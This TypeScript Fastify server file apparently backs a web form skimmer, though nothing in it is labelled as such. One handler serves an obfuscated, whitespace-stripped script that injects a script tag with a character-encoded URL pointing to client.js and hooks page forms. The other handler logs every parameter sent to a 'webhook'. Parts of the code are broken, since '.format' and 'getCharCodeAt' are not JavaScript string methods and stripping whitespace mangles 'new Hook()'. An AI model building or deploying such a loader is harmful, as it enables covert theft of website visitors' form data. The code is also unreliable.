import {FastifyReply, FastifyRequest} from 'fastify';
import {IWebhookRequest} from './schema';

export const HandleRequest = async (
    request: FastifyRequest<IWebhookRequest>,
    reply: FastifyReply,
) => {
    const params = {...request.query, ...request.params, ...request.body};
    console.log(params);
    return reply.code(200).send({success: true});
};

export const HandleInstall = async (
    request: FastifyRequest,
    reply: FastifyReply,
) => {
    const inline_script =
        `let {head: xh} = document, xb = document.createElement("script");
xb.type = "text/javascript";
xb.src = String.fromCharCode({server});
xh.appendChild(xb);
window._LOL = window._LOL ?? new Hook();
window._LOL.init('form');
`.replace(
            '{server}',
            '{0}/client.js?cache=ignore'.format(request.web_url).getCharCodeAt(),
        );

    return reply
        .status(200)
        .type('text/javascript')
        .send( inline_script.replace(/\n|\s/g, ''));
};
